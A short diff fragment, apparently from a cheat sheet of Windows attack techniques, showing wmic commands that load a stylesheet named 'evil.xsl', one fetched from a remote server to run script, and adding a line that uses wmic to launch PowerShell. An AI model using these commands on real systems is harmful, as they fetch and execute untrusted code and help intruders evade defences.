@@ -80,3 +80,4 @@ version="1.0">
 wmic os get /FORMAT:"evil.xsl"
 wmic os get /FORMAT:"https://server/evil.xsl"
 -------------------------------------
+11) wmic process call create powershell.exe
